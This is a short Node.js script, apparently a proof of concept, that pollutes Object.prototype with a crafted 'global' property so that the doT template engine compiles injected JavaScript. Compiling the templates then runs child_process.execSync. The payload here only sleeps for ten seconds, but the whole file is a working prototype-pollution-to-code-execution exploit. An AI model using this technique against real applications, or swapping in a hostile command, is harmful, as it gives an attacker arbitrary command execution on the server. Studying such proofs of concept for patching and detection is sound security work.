'use strict';

var doT = require('dot');

Object.prototype.global = "}process.mainModule.require('child_process').execSync(\`sleep 10\`)}())//";

const templates = doT.process({path: __dirname+'/views'});
var mytemplate = require(__dirname+'/views/mytemplate.js')